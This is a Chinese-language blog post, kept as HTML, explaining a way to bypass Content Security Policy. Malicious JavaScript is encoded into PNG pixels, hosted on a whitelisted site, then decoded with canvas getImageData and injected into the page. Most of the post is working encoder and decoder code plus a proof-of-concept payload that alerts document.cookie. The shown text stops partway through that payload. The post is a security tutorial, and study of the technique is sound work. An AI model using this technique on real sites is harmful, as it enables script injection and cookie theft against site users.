<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"-181.github.io","root":"/","scheme":"Pisces","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
  </script>

  <meta name="description" content="CSP绕过方法之隐藏图像XSS漏洞中，可使用CSP绕过。 CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。 CSP绕过原理：利用HTML Canvas将恶意JavaScript代码转化为PNG图像，以隐藏恶意代码；然后将图像上传至正规网站，如Twitter或Google(通常由CSP列入白名单)；再利用canvas getImageData方法，从">
<meta property="og:type" content="article">
<meta property="og:title" content="CSP绕过方法之隐藏图像">
<meta property="og:url" content="https://-181.github.io/2021/04/22/CSP%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B9%8B%E9%9A%90%E8%97%8F%E5%9B%BE%E5%83%8F/index.html">
<meta property="og:site_name" content="左">
<meta property="og:description" content="CSP绕过方法之隐藏图像XSS漏洞中，可使用CSP绕过。 CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。 CSP绕过原理：利用HTML Canvas将恶意JavaScript代码转化为PNG图像，以隐藏恶意代码；然后将图像上传至正规网站，如Twitter或Google(通常由CSP列入白名单)；再利用canvas getImageData方法，从">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/%E6%8E%A7%E5%88%B6%E5%8F%B0.png">
<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/hello.png">
<meta property="og:image" content="https://gitee.com/chen-lishan/tuc/raw/master/%E5%9B%BE%E7%89%87.png">
<meta property="article:published_time" content="2021-04-21T16:00:00.000Z">
<meta property="article:modified_time" content="2021-07-19T09:18:19.941Z">
<meta property="article:author" content="左">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/chen-lishan/tuc/raw/master/%E6%8E%A7%E5%88%B6%E5%8F%B0.png">


<link rel="canonical" href="https://-181.github.io/2021/04/22/CSP%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B9%8B%E9%9A%90%E8%97%8F%E5%9B%BE%E5%83%8F/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CSP绕过方法之隐藏图像 | 左</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">左</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">春有百花秋有月， 夏有凉风冬有雪</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSP%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B9%8B%E9%9A%90%E8%97%8F%E5%9B%BE%E5%83%8F"><span class="nav-number">1.</span> <span class="nav-text">CSP绕过方法之隐藏图像</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%9B%BE%E5%83%8F"><span class="nav-number">1.0.1.</span> <span class="nav-text">创建图像</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8E%E5%9B%BE%E5%83%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E4%BB%A3%E7%A0%81"><span class="nav-number">1.0.2.</span> <span class="nav-text">从图像中提取代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E6%8E%A8%E7%89%B9%E4%B8%8A%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="nav-number">1.0.3.</span> <span class="nav-text">在推特上的操作</span></a></li></ol></li></ol></li></ol></div>
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="左"
      src="/image/avatar.jpg">
  <p class="site-author-name" itemprop="name">左</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/04/22/CSP%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E4%B9%8B%E9%9A%90%E8%97%8F%E5%9B%BE%E5%83%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CSP绕过方法之隐藏图像
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-04-22 00:00:00" itemprop="dateCreated datePublished" datetime="2021-04-22T00:00:00+08:00">2021-04-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-07-19 17:18:19" itemprop="dateModified" datetime="2021-07-19T17:18:19+08:00">2021-07-19</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="CSP绕过方法之隐藏图像"><a href="#CSP绕过方法之隐藏图像" class="headerlink" title="CSP绕过方法之隐藏图像"></a>CSP绕过方法之隐藏图像</h1><p>XSS漏洞中，可使用CSP绕过。</p>
<p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。</p>
<p>CSP绕过原理：利用HTML Canvas将恶意JavaScript代码转化为PNG图像，以隐藏恶意代码；然后将图像上传至正规网站，如Twitter或Google(通常由CSP列入白名单)；再利用canvas <code>getImageData</code>方法，从图像中提取“隐藏的JavaScript代码”并执行。</p>
<h3 id="创建图像"><a href="#创建图像" class="headerlink" title="创建图像"></a>创建图像</h3><p>使用<code>putImageData</code>方法创建一个图像，用RGB色彩模式表示”Hello, World!”字符串（每三个一组），在浏览器控制台中运行如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    function encode(a) &#123;</span><br><span class="line">        if (a.length) &#123;</span><br><span class="line">            var c &#x3D; a.length,</span><br><span class="line">                e &#x3D; Math.ceil(Math.sqrt(c &#x2F; 3)),</span><br><span class="line">                f &#x3D; e,</span><br><span class="line">                g &#x3D; document.createElement(&quot;canvas&quot;),</span><br><span class="line">                h &#x3D; g.getContext(&quot;2d&quot;);</span><br><span class="line">            g.width &#x3D; e, g.height &#x3D; f;</span><br><span class="line">            var j &#x3D; h.getImageData(0, 0, e, f),</span><br><span class="line">                k &#x3D; j.data,</span><br><span class="line">                l &#x3D; 0;</span><br><span class="line">            for (var m &#x3D; 0; m &lt; f; m++)</span><br><span class="line">                for (var n &#x3D; 0; n &lt; e; n++) &#123;</span><br><span class="line">                    var o &#x3D; 4 * (m * e) + 4 * n,</span><br><span class="line">                        p &#x3D; a[l++],</span><br><span class="line">                        q &#x3D; a[l++],</span><br><span class="line">                        r &#x3D; a[l++];</span><br><span class="line">                    (p || q || r) &amp;&amp; (p &amp;&amp; (k[o] &#x3D; ord(p)), q &amp;&amp; (k[o + 1] &#x3D; ord(q)), r &amp;&amp; (k[o + 2] &#x3D; ord(r)), k[o + 3] &#x3D; 255)</span><br><span class="line">                &#125;</span><br><span class="line">            return h.putImageData(j, 0, 0), h.canvas.toDataURL()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    var ord &#x3D; function ord(a) &#123;</span><br><span class="line">        var c &#x3D; a + &quot;&quot;,</span><br><span class="line">            e &#x3D; c.charCodeAt(0);</span><br><span class="line">        if (55296 &lt;&#x3D; e &amp;&amp; 56319 &gt;&#x3D; e) &#123;</span><br><span class="line">            if (1 &#x3D;&#x3D;&#x3D; c.length) return e;</span><br><span class="line">            var f &#x3D; c.charCodeAt(1);</span><br><span class="line">            return 1024 * (e - 55296) + (f - 56320) + 65536</span><br><span class="line">        &#125;</span><br><span class="line">        return 56320 &lt;&#x3D; e &amp;&amp; 57343 &gt;&#x3D; e ? e : e</span><br><span class="line">    &#125;,</span><br><span class="line">    d &#x3D; document,</span><br><span class="line">    b &#x3D; d.body,</span><br><span class="line">    img &#x3D; new Image;</span><br><span class="line">    var stringenc &#x3D; &quot;Hello, World!&quot;;</span><br><span class="line">    img.src &#x3D; encode(stringenc), b.innerHTML &#x3D; &quot;&quot;, b.appendChild(img)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>运行后，浏览器左上角会显示一个图像：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E6%8E%A7%E5%88%B6%E5%8F%B0.png"></p>
<h3 id="从图像中提取代码"><a href="#从图像中提取代码" class="headerlink" title="从图像中提取代码"></a>从图像中提取代码</h3><p>通过getImageData方法，将生成的PNG图像转换为原始字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">t &#x3D; document.getElementsByTagName(&quot;img&quot;)[0];</span><br><span class="line">var s &#x3D; String.fromCharCode, c &#x3D; document.createElement(&quot;canvas&quot;);</span><br><span class="line">var cs &#x3D; c.style,</span><br><span class="line">    cx &#x3D; c.getContext(&quot;2d&quot;),</span><br><span class="line">    w &#x3D; t.offsetWidth,</span><br><span class="line">    h &#x3D; t.offsetHeight;</span><br><span class="line">c.width &#x3D; w;</span><br><span class="line">c.height &#x3D; h;</span><br><span class="line">cs.width &#x3D; w + &quot;px&quot;;</span><br><span class="line">cs.height &#x3D; h + &quot;px&quot;;</span><br><span class="line">cx.drawImage(t, 0, 0);</span><br><span class="line">var x &#x3D; cx.getImageData(0, 0, w, h).data;</span><br><span class="line">var a &#x3D; &quot;&quot;,</span><br><span class="line">    l &#x3D; x.length,</span><br><span class="line">    p &#x3D; -1;</span><br><span class="line">for (var i &#x3D; 0; i &lt; l; i +&#x3D; 4) &#123;</span><br><span class="line">    if (x[i + 0]) a +&#x3D; s(x[i + 0]);</span><br><span class="line">    if (x[i + 1]) a +&#x3D; s(x[i + 1]);</span><br><span class="line">    if (x[i + 2]) a +&#x3D; s(x[i + 2]);</span><br><span class="line">&#125;</span><br><span class="line">console.log(a);</span><br><span class="line">document.getElementsByTagName(&quot;body&quot;)[0].innerHTML&#x3D;a;</span><br></pre></td></tr></table></figure>

<p>运行代码之后显示：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/hello.png"></p>
<h3 id="在推特上的操作"><a href="#在推特上的操作" class="headerlink" title="在推特上的操作"></a>在推特上的操作</h3><p>当上传的图片太小时，推特上会上传失败，因此需要使用一个较长的JavaScript代码。可以在前面那段代码最后添加随机注释，以此来创建一个较大的图像：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    function encode(a) &#123;</span><br><span class="line">        if (a.length) &#123;</span><br><span class="line">            var c &#x3D; a.length,</span><br><span class="line">                e &#x3D; Math.ceil(Math.sqrt(c &#x2F; 3)),</span><br><span class="line">                f &#x3D; e,</span><br><span class="line">                g &#x3D; document.createElement(&quot;canvas&quot;),</span><br><span class="line">                h &#x3D; g.getContext(&quot;2d&quot;);</span><br><span class="line">            g.width &#x3D; e, g.height &#x3D; f;</span><br><span class="line">            var j &#x3D; h.getImageData(0, 0, e, f),</span><br><span class="line">                k &#x3D; j.data,</span><br><span class="line">                l &#x3D; 0;</span><br><span class="line">            for (var m &#x3D; 0; m &lt; f; m++)</span><br><span class="line">                for (var n &#x3D; 0; n &lt; e; n++) &#123;</span><br><span class="line">                    var o &#x3D; 4 * (m * e) + 4 * n,</span><br><span class="line">                        p &#x3D; a[l++],</span><br><span class="line">                        q &#x3D; a[l++],</span><br><span class="line">                        r &#x3D; a[l++];</span><br><span class="line">                    (p || q || r) &amp;&amp; (p &amp;&amp; (k[o] &#x3D; ord(p)), q &amp;&amp; (k[o + 1] &#x3D; ord(q)), r &amp;&amp; (k[o + 2] &#x3D; ord(r)), k[o + 3] &#x3D; 255)</span><br><span class="line">                &#125;</span><br><span class="line">            return h.putImageData(j, 0, 0), h.canvas.toDataURL()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    var ord &#x3D; function ord(a) &#123;</span><br><span class="line">        var c &#x3D; a + &quot;&quot;,</span><br><span class="line">            e &#x3D; c.charCodeAt(0);</span><br><span class="line">        if (55296 &lt;&#x3D; e &amp;&amp; 56319 &gt;&#x3D; e) &#123;</span><br><span class="line">            if (1 &#x3D;&#x3D;&#x3D; c.length) return e;</span><br><span class="line">            var f &#x3D; c.charCodeAt(1);</span><br><span class="line">            return 1024 * (e - 55296) + (f - 56320) + 65536</span><br><span class="line">        &#125;</span><br><span class="line">        return 56320 &lt;&#x3D; e &amp;&amp; 57343 &gt;&#x3D; e ? e : e</span><br><span class="line">    &#125;,</span><br><span class="line">    d &#x3D; document,</span><br><span class="line">    b &#x3D; d.body,</span><br><span class="line">    img &#x3D; new Image;</span><br><span class="line">    var stringenc &#x3D; &quot;function asd() &#123;\</span><br><span class="line">        var d &#x3D; document;\</span><br><span class="line">        var c &#x3D; &#39;cookie&#39;;\</span><br><span class="line">        alert(d[c]);\</span><br><span class="line">    &#125;;asd();&#x2F;*Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam aliquam blandit metus vel elementum. Mauris mi tortor, congue eget fringilla id, tempus a tellus. Morbi laoreet vitae ipsum vel dapibus. Nunc eu faucibus ligula. Donec maximus malesuada justo. Nulla congue, risus quis dapibus porttitor, metus quam rutrum dolor, ac maximus nibh metus quis enim. Aenean hendrerit venenatis massa ac gravida. Donec at nisi quis ex sollicitudin bibendum sit amet ac quam.\</span><br><span class="line">    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\</span><br><span class="line">    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\</span><br><span class="line">    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\</span><br><span class="line">    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\</span><br><span class="line">    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\</span><br><span class="line">    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\</span><br><span class="line">    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\</span><br><span class="line">    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\</span><br><span class="line">    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\</span><br><span class="line">    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\</span><br><span class="line">    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\</span><br><span class="line">    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\</span><br><span class="line">    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra dui turpis, sed pellentesque magna porttitor vitae. Phasellus pharetra justo eu lectus ullamcorper, ut mollis lectus dictum. Duis efficitur tellus sed ante semper, eget iaculis nunc iaculis. Suspendisse tristique non ante ac lobortis.\</span><br><span class="line">    Phasellus auctor lectus nibh, non vulputate sem tristique sit amet. Pellentesque fringilla dolor vitae dapibus porta. Vivamus nec neque ante. In commodo neque ut turpis feugiat tempor. Duis pulvinar enim imperdiet condimentum iaculis. Maecenas ac pellentesque erat. Sed tempor a turpis eu eleifend. Cras elit nibh, aliquam ac sapien vulputate, accumsan rhoncus nunc. Nulla ut porta arcu. Sed imperdiet luctus sapien, eu viverra est lacinia in. Curabitur volutpat, enim nec hendrerit malesuada, felis libero facilisis enim, vitae tincidunt felis libero nec tortor. Sed lorem tellus, fringilla lobortis pharetra vitae, dignissim ac nibh. Curabitur eu ultricies mi. Aliquam erat volutpat. Aenean tincidunt diam quis hendrerit euismod. Etiam sed nibh eu est dignissim ultricies.\</span><br><span class="line">    Sed cursus felis eu tellus sollicitudin, a luctus lacus tempor. Aenean elit est, vulputate vitae commodo et, pellentesque vitae dui. Etiam volutpat accumsan congue. Mauris maximus at lorem nec auctor. Vestibulum porta magna et suscipit faucibus. Vestibulum sit amet neque ligula. In hac habitasse platea dictumst. Nullam sed tortor congue, volutpat lectus sit amet, convallis ante.\</span><br><span class="line">    Phasellus vel bibendum mi. Nam hendrerit justo eget massa lobortis sodales. Morbi nec ligula sem. Nullam felis nibh, tempor lobortis leo eu, vehicula ornare libero. Vestibulum lorem sapien, rhoncus nec ante nec, dignissim tincidunt urna. Sed rutrum tellus at nisl fringilla semper. Duis pharetra 